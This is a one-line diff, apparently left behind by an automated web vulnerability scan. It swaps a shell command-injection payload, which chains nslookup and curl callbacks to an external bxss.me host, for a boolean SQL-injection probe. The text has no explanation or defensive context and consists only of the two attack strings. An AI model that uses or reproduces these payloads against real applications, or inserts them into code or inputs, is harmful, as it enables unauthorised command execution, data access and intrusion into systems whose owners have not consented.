@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitcctexbwzvxb8bb5.bxss.me||curl hitcctexbwzvxb8bb5.bxss.me)|(nslookup -q=cname hitcctexbwzvxb8bb5.bxss.me||curl hitcctexbwzvxb8bb5.bxss.me)&(nslookup -q=cname hitcctexbwzvxb8bb5.bxss.me||curl hitcctexbwzvxb8bb5.bxss.me)
+-1" OR 3+308-308-1=0+0+0+1 -- 
